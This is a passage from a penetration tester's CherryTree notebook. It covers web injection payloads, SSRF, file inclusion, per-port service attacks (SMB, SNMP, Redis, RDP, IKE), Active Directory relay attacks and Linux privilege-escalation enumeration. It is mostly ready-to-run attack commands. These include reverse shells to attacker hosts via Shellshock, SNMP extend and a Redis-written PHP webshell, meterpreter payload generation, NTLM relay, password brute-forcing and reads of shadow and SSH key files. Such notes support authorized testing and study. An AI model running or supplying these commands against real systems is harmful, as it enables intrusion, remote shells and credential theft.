         - Check for URL decoded occurences
      ▪ Add parameters
      ▪ Remove parameters
      ▪ Change values
   ◇ Injection
</rich_text>
            <rich_text foreground="#f9f9f0f06b6b">      ▪ SQL injection
         </rich_text>
            <rich_text>- Check places app talks to DB
            → Auth forms
            → Search engines
            → ecommmerce
         - Try these characters
            → ' ; -- /* */
         - </rich_text>
            <rich_text foreground="#e0e01b1b2424">UNION</rich_text>
            <rich_text>
            → http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--
         - </rich_text>
            <rich_text foreground="#e0e01b1b2424">Error Based</rich_text>
            <rich_text>
            → http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
         - </rich_text>
            <rich_text foreground="#e0e01b1b2424">OOB</rich_text>
            <rich_text>
            → http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--
         - </rich_text>
            <rich_text foreground="#e0e01b1b2424">Boolean Blind</rich_text>
            <rich_text>
            → http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--</rich_text>
            <rich_text foreground="#f9f9f0f06b6b">
      ▪ LDAP Injection
        </rich_text>
            <rich_text> - Web Application uses search filters
         - http://www.example.com/ldapsearch?user=John
            → </rich_text>
            <rich_text link="webs http://www.example.com/ldapsearch?user=*">http://www.example.com/ldapsearch?user=*</rich_text>
            <rich_text>
         - &amp; | ! = ~= &gt;= &lt;= * ()</rich_text>
            <rich_text foreground="#f9f9f0f06b6b">
      ▪ XML Injection
      </rich_text>
            <rich_text>   - XML may be present in request body or response
         - Try metacharacters
            → - " &lt;!--/-- &gt; &lt;!\[CDATA\[ / ]]&gt;
            </rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text foreground="#f9f9f0f06b6b">
      ▪ SSI Injection
         </rich_text>
            <rich_text>- Test all input including body and headers
            → &lt;!--#echo var="VAR" --&gt;
            → can lead to rce
               ⇒ &lt;!--#exec cmd="/bin/ps ax"--&gt;</rich_text>
            <rich_text foreground="#f9f9f0f06b6b">
      ▪ XPATH injection
</rich_text>
            <rich_text>         - Similar to sql injection
         - ' or '1' = '1</rich_text>
            <rich_text foreground="#f9f9f0f06b6b">
      ▪ IMAP SMTP Injection
</rich_text>
            <rich_text>         - webmail
         - detection
            → Assign nul vlues to param
            → change existing values
            → add non-standardchars
            → add new params
            → get rid of params
</rich_text>
            <rich_text foreground="#f9f9f0f06b6b">      ▪ Code Injection
        </rich_text>
            <rich_text> - php injection
            → &amp;cmd=uname%20-a
         - asp code injection
            → files may be opened upon submission</rich_text>
            <rich_text foreground="#f9f9f0f06b6b">
      ▪ Command Injection
         - </rich_text>
            <rich_text>| ; &amp; $ &gt; &lt; ' \ ! &gt;&gt; #</rich_text>
            <rich_text foreground="#f9f9f0f06b6b">
      ▪ Format String
         </rich_text>
            <rich_text>- ?username=%25s%25s%25s%25n
            → {event.__init__.__globals__[CONFIG][SECRET_KEY]}
            → %p%p%p%p%p</rich_text>
            <rich_text foreground="#f9f9f0f06b6b">
      ▪ Host Header
        </rich_text>
            <rich_text> - www.attacker.com
         - X-Forwarded-Host: www.attacker.com</rich_text>
            <rich_text foreground="#f9f9f0f06b6b">
      ▪ Template Injection</rich_text>
            <rich_text>
         - ?name={{7*7}}
            → a{{bar}}b
            → {var} ${var} {{var}} &lt;%var%&gt; [% var %]
   ◇ </rich_text>
            <rich_text foreground="#f9f9f0f06b6b">SSRF</rich_text>
            <rich_text>
      ▪ Load remote file
         - https://example.com/page?page=https://malicioussite.com/shell.php
      ▪ Load restriced file
         - https://example.com/page?page=http://localhost/admin
      ▪ Try changing the domain to localhost or  variation such as 127.0.0.1 or 127.1
      ▪ try to add file:///etc/passwd
      ▪ Blind SSRF
      ▪ pdf file conversion
   ◇ </rich_text>
            <rich_text foreground="#f9f9f0f06b6b">File Inclusion</rich_text>
            <rich_text>
      ▪ Local
         - ?file=../../../../etc/passwd
         - php wrappers may lead to code execution
      ▪ Remote
         - ?file=http://attacker_site/malicous_page
      ▪ Filter evasion likely necessary

</rich_text>
            <rich_text scale="h3">11. Business Logic</rich_text>
            <rich_text>
   ◇ Attempt to avoid id checks, session validation, checkouts
   ◇ Manipulate parameters related to id, session, status' and cost or item number
   ◇ Guess logical values, check for hidden options
   ◇ Check for race conditions
   ◇ establish and circumvent workflows
   ◇ upload unexpected file types

</rich_text>
            <rich_text scale="h3">12. Client-Side</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">13.  General Filter Evasion Techniques</rich_text>
            <rich_text>
   ◇ Null Byte
      ▪ /x00 or %00
   ◇ URL encoding
      ▪ Double URL encoding
   ◇ String deletion bypass
      ▪ &lt;scr&lt;script&gt;ipt&gt; → &lt;script&gt;
         - filter gets rind of script but is replaced with script when script is removed
   ◇ base64
   ◇ Avoiding certain characters
   ◇ Case sensitivity
   ◇ HTML Entities
   ◇ using grave accents ``
   ◇ Using the browsers attempts to fix code
      ▪ chrome replaces missing quotes as an example
   ◇ in javascript string fromCharCode can be used
   ◇ Hex encode
   ◇ Decimal encode
   ◇ Octal encode</rich_text>
            <codebox char_offset="4630" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="xml" highlight_brackets="1" show_line_numbers="1">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
    &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
        &lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;]&gt;
        &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</codebox>
            <node name="CMS" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652718594" ts_lastsave="1653280411">
              <rich_text>Tomcat

WordPress

Webmin

</rich_text>
            </node>
            <node name="Common Exploits" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652718605" ts_lastsave="1652718809">
              <rich_text scale="h2">Shellshock</rich_text>
              <rich_text>
</rich_text>
              <rich_text justification="left"></rich_text>
              <rich_text>

</rich_text>
              <rich_text scale="h2">Heartbleed</rich_text>
              <rich_text>
</rich_text>
              <rich_text justification="left"></rich_text>
              <codebox char_offset="11" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">env x=`() { :;}; echo vulnerable' bash -c "echo test"
nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi x.x.x.x -p 80
wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat/etc/passwd http://x.x.x.x/cgi-bin/login.cgi &amp;&amp; cat login.cgi
	wget -U "() { foo;};echo; /bin/nc &lt;IP&gt; &lt;PORT&gt; -e /bin/sh" http://x.x.x.x/cgi-bin/login.cgi</codebox>
              <codebox char_offset="25" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">nmap --script ssl-heartbleed x.x.x.x
auxiliary/scanner/ssl/openssl_heartbleed</codebox>
            </node>
          </node>
          <node name="110 POP3" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652104255" ts_lastsave="1652104395">
            <rich_text scale="h2">Automated Recon</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Connect</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="16" justification="left" frame_width="200" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">ls -l /usr/share/nmap/script | grep -i pop3</codebox>
            <codebox char_offset="27" justification="left" frame_width="200" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">nc -nv x.x.x.x 110
telnet x.x.x.x 110
#commands
USER user
PASS pass
LIST
RETR 1</codebox>
          </node>
          <node name="111 NFS" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652104440" ts_lastsave="1652104562">
            <rich_text scale="h2">Config</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="7" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">cat /etc/exports

#Listing Mounts and users
showmount -e x.x.x.x
rusers -al x.x.x.x
#Mounting
mount &gt; sudo mount -o port=34505 -t nfs 10.10.10.76:/some_directory /mnt/test
mount &gt; sudo mount -t fts 10.10.10.76:/home ~/nfs-share
mount &gt; sudo mount -t nfs -o nfsvers=3 10.11.1.72:/home ~/nfs-share</codebox>
          </node>
          <node name="135/593 RPC" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652104592" ts_lastsave="1652129068">
            <rich_text scale="h2">Automated Recon</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Anonymous Login</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="16" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#metasploit
use auxiliary/scanner/dcerpc/endpoint_mapper
use auxiliary/scanner/dcerpc/hidden
use auxiliary/scanner/dcerpc/management
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
#nmap
ls -l /usr/share/nmap/script | grep -i rpc
rpcdump x.x.x.x -p 135</codebox>
            <codebox char_offset="35" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">rpcclient -U “” -N x.x.x.x
#commands
enumdomusers
enumdomgroups
queryuser USER
enumprivs
lookupnames NAME</codebox>
          </node>
          <node name="139/445 SMB" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652105610" ts_lastsave="1653148052">
            <rich_text scale="h2">Automated Recon</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Listing Shares</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Connecting</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Mounting</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="16" justification="left" frame_width="200" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">ls -l /usr/share/nmap/script | grep -i smb
#enum4linux
enum4linux -A x.x.x.x</codebox>
            <codebox char_offset="34" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">smbmap -H x.x.x.x
smbclient -N -L //x.x.x.x</codebox>
            <codebox char_offset="48" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">smbclient -N //x.x.x.x/share
smbclient -U user -P pass //x.x.x.x.share
#smbrelay attack
msfvenom -p windows/meterpreter/reverse_tcp LHOST=​attacker_ip ​LPORT=​port ​-f exe -o file_name.​exe
smbrelayx -h x.x.x.x -e badexe.exe #use generated exe from above
psexec "&lt;user&gt;"@&lt;ip&gt; -</codebox>
            <codebox char_offset="60" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1"></codebox>
          </node>
          <node name="143 IMAP" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652129469" ts_lastsave="1652129599">
            <rich_text scale="h2">Connecting</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="11" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">telnet target.com 143
#commands
a1 LOGIN user password
a2 LIST "" "*"
a3 EXAMINE INBOX
a4 FETCH 1 BODY[]
a5 FETCH 2 BODY[]</codebox>
          </node>
          <node name="161 SNMP" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652129599" ts_lastsave="1652130393">
            <rich_text scale="h2">Automated Recon</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Quick Win Reverse Shell</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="16" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">snmpwalk -v2c -c public x.x.x.x
ls -l /usr/share/nmap/script | grep -i snmp
#after obtaining c_name
snmpwalk -c c_string -v version x.x.x.x #snmp info 
snmpwalk -c c_string -v version x.x.x.x OID #info given oid
snmpset -c c_string -v version x.x.x.x OID value_type value #changes info</codebox>
            <codebox char_offset="43" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c_string x.x.x.x 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"AttacerIP\",1337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
snmpwalk -v2c -c c_string x.x.x.x NET-SNMP-EXTEND-MIB::nsExtendObjects</codebox>
          </node>
          <node name="500 IKE" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652130393" ts_lastsave="1653689133">
            <rich_text scale="h2">Enumeration</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Connecting</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="12" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#Check transformation
ike-scan -M x.x.x.x #look for 1 returned handshake; 0 returned notify
#Check ID and brute
ike-scan -P -M -A -n fakeID x.x.x.x #nothing should be returned
#brute script
while read line; do (echo "Found ID: $line" &amp;&amp; sudo ike-scan -M -A -n $line x.x.x.x) | grep -B14 "1 returned handshake" | grep "Found ID:"; done &lt; /usr/share/seclists/Miscellaneous/ike-groupid.txt
#grab hash
ike-scan -M -A -n &lt;ID&gt; --pskcrack=hash.txt x.x.x.x
#trans to john
ikescan2john
#crack w/ john</codebox>
            <codebox char_offset="26" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">cat &gt; /etc/vpnc/vpntest.conf &lt;&lt; STOP
IPSec gateway x.x.x.x
IPSec ID vpntest
IPSec secret GROUPSECRET
IKE Authmode psk
Xauth username USER
Xauth password PASS
STOP

vpnc vpntest
VPNC started in background (pid: 6980)...
ifconfig tun0</codebox>
          </node>
          <node name="1433 MS-SQL" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1653689133" ts_lastsave="1653689133"/>
          <node name="3389 RDP" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652130851" ts_lastsave="1652130944">
            <rich_text scale="h2">Connecting</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Add User</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="11" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">rdesktop -u &lt;username&gt; x.x.x.x
rdesktop -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; x.x.x.x
xfreerdp /u:[domain\]&lt;username&gt; /p:&lt;password&gt; /v:x.x.x.x
xfreerdp /u:[domain\]&lt;username&gt; /pth:&lt;hash&gt; /v:x.x.x.x</codebox>
            <codebox char_offset="23" justification="left" frame_width="200" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">net localgroup "Remote Desktop Users" username /add</codebox>
          </node>
          <node name="3306 MYSQL" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652130944" ts_lastsave="1652130990">
            <rich_text scale="h2">Connecting</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="11" justification="left" frame_width="200" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">mysql -h x.x.x.x -u root -p</codebox>
          </node>
          <node name="5985 WINRM" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652131012" ts_lastsave="1652131061">
            <rich_text scale="h2">Connecting</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="11" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">evil-winrm -i 10.10.10.82 -u USER -p 'PASS'</codebox>
          </node>
          <node name="6379 REDIS" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652131061" ts_lastsave="1652131187">
            <rich_text scale="h2">Quick Win Reverse Shell</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="24" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">redis-cli -h x.x.x.x
&gt; INFO #check for keyspace
&gt; config set dir /var/www/html
&gt; config set dbfilename redis.php #you may be able to write to a certain directory
&gt; set test “”
&gt; save #this can be used to test and write
&gt; set test "&lt;?php exec(\"/bin/bash -c 'bash -i &gt; /dev/tcp/10.13.21.202/8001 0&gt;&amp;1'\"); ?&gt;"
&gt; save #this can be used to inject code to a bash command and get a reverse shell</codebox>
          </node>
        </node>
        <node name="Weak Password" unique_id="65" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652311137" ts_lastsave="1652718852">
          <rich_text scale="h2">Weak Passwords</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="15" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#ncrack
ncrack 10.10.10.0/24
ncrack www.domain.com
ncrack 10.10.1,2-200
ncrack service://10.10.10.130:22
ncrack -U /userdict/path -P /passdict/path x.x.x.x
ncrack -i nmapfile
#medusa
medusa -q #list modules
medusa -h 10.10.10.10 -M telnet -U userlist -P passlist
#patator
patator MOD host=FILE0 user=FILE1 password -FILE2 0=hosts.tt 1=logins.txt 2=pass.txt -x ignore:mesg='Auth fail.'
#CeWL
cewl http://target.com
cewl -m 8 http://target.com #minimum of 8 chars
fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt &lt;ZIP-FILE&gt; #for zip pass... duh</codebox>
        </node>
      </node>
      <node name="Active Directory" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1653092159" ts_lastsave="1653100003">
        <node name="Windows" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1653099999" ts_lastsave="1653144764">
          <rich_text scale="h2">Abusing IPv6</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">LLMNR Posioning</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">SMB Relay</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">Passback Attacks</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="13" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">mitm6 -d example.com
nlmrelayx -6 -t ldaps://192.168.0.1 -wh fakewpad.example.com -l lootme</codebox>
          <codebox char_offset="32" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">#responder captures ntlm hash
responder --l tun0 -rdw
#cause error, try to access smb or http
hashcat -m 5600 hash.txt wordlist.txt</codebox>
          <codebox char_offset="45" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">#smb signing disabled
#creds on admin machine
#turn smb off and http off in responder.conf
responder --l tun0 -rdw
#cause err
ntlmrelayx -tf targets.txt --smb2support</codebox>
          <codebox char_offset="65" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">responder --l tun0 -rdw
#printer attempts to authenticate and sends creds in clear</codebox>
        </node>
      </node>
    </node>
    <node name="Local Recon and Exploitation" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652129766" ts_lastsave="1653084880">
      <node name="Linux" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652129775" ts_lastsave="1652982607">
        <node name="Initial Enumeration" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652131228" ts_lastsave="1654724874">
          <rich_text scale="h1">System Enumeration</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">User Enumeration</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">Interesting Files and Tasks</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">Software Enumeration</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">Network Enumeration</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">Password Hunting</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="19" justification="left" frame_width="50" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">uname -a
cat /proc/version
cat /etc/issue
cat /proc/cpuinfo
cat /proc/meminfo
lshw
lscpu
lsmod
df -h
lspci
lsusb
ps aux ## if anything looks out of the ordinary run pspy and you might find smth
ls -al /etc/init.d/
find /etc/init.d/ ! -uid 0 -type f 2&gt;/dev/null |xargs ls -la
env</codebox>
          <codebox char_offset="39" justification="left" frame_width="110" frame_height="55" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">whoami
id
#interesting group?
find / -group *group* 2&gt;/dev/null
sudo -l
cat /etc/passwd
cat /etc/shadow
cat /etc/group
cat /etc/sudoers
ls -als /home/*/.ssh
ls -als /home/*/.gnupg/
ls -als /home/*/.config/
last -a
w
history</codebox>
          <codebox char_offset="70" justification="left" frame_width="215" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#look for suid binaries
find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;
find / -uid 0 -perm -4000 -type f 2&gt;/dev/null
find / -type f -user root -perm -u=s 2&gt;/dev/null 
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null
#get capabilities, look for =ep
getcap -r / 2&gt;/dev//null
# last edited files
find / -mmin -10 2&gt;/dev/null | grep -Ev "^/proc" 
lsof
#history file
find /* -name *.*history* -print 2&gt; /dev/null
#writeable files
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2&gt;/dev/null
find / -perm -2 -type f 2&gt;/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2&gt;/dev/null
find / -writable ! -group $group -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2&gt;/dev/null
#timers
systemctl list-timers --all 
#scheduled tasks
crontab -l
ls -al /etc/cron*
find /etc/cron* -type f -perm -o+w -exec ls -l {} \
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
#Tampering with interesting files we have discovered
ltrace file 2&gt;/dev/null
strace file 2&gt;/dev/null
#NFS Root Squash
cat /etc/exports</codebox>
          <codebox char_offset="94" justification="left" frame_width="110" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">which python
locate python
dpkg -l | grep nginx
python -v
python --version
#Check for mounted docker socket
find / -name docker.sock 2&gt;/dev/null</codebox>
          <codebox char_offset="117" justification="left" frame_width="50" frame_height="55" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">ifconfig -a #Network interfaces
hostname -f
cat /etc/hosts
ip a
ip route
route -n
ip addr show
ss -twurp # Lists active connections and processes
netstat -auntp
arp -a #arp cache
ip neigh
netstat -ano
nmap -sT -p$ports portquiz.net #outbound firewall rules
cat /etc/resolv.conf #DNS servers</codebox>
          <codebox char_offset="137" justification="left" frame_width="440" frame_height="40" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">cat grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2&gt;/dev/null
locate password | more
find / -name authorized_keys 2&gt; /dev/null
find / -name id_rsa 2&gt;/dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
strings /dev/mem -n10 | grep -i PASS
cat * | grep -i passw*
cat /var/log/apache/access.log |grep -E “^user|^pass”</codebox>
        </node>
        <node name="Local Exploitation" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652720795" ts_lastsave="1655702190">
          <rich_text scale="h2">Sudo</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
	
</rich_text>
          <rich_text scale="h2">SUID</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">Capabilities</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">RootSquash</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">Writeable /etc/passwd</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">Cron Jobs - File Permissions</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h2">Cron Jobs - Wildcards</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="5" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#sudo privileges
sudo -l #gtfobins for quickwins
#LD_PRELOAD
##Loads a library before other libraries, find code online for mal library
##compile with gcc -fPIC shared shell.so shell.c -nostartfiles
sudo LD_PRELOAD=$PATH/shell.so vim</codebox>
          <codebox char_offset="14" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#suid bit
find / -perm -u=s -type f 2&gt;/dev/null
#use gtfobins for wins
#Shared Object
strace suspicious_suid_binary | grep -iE "no such file or directory"
#env vars</codebox>
          <codebox char_offset="30" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">getcap -r / 2&gt;/dev/null</codebox>
